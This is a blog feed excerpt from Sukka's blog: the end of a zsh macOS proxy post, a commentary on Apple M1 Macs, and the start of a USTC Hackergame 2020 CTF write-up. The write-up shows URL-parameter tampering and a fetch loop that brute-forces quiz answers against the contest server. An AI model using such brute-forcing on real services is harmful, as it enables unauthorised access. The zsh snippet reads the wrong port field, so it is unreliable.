也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div>ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-12-07</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2'20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3'18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13'，相比上一代搭载了 Intel i7 的 MacBook Pro 13'，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3'19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13' 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13' 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13' 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12' Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div>谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div>            <div>              <div>本文作者</div>\n<div>Sukka</div>\n</div>\n<div>              <div>发布于</div>\n<div>2020-11-11</div>\n</div>\n<div>              <div>许可协议</div>\n<div><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/1.png\" width=\"508\" height=\"417\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/2.png\" width=\"794\" height=\"327\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.5/25.png\" width=\"636\" height=\"277\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://npm.elemecdn.com/sks@0.4.4/3.png\" width=\"482\" height=\"393\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> 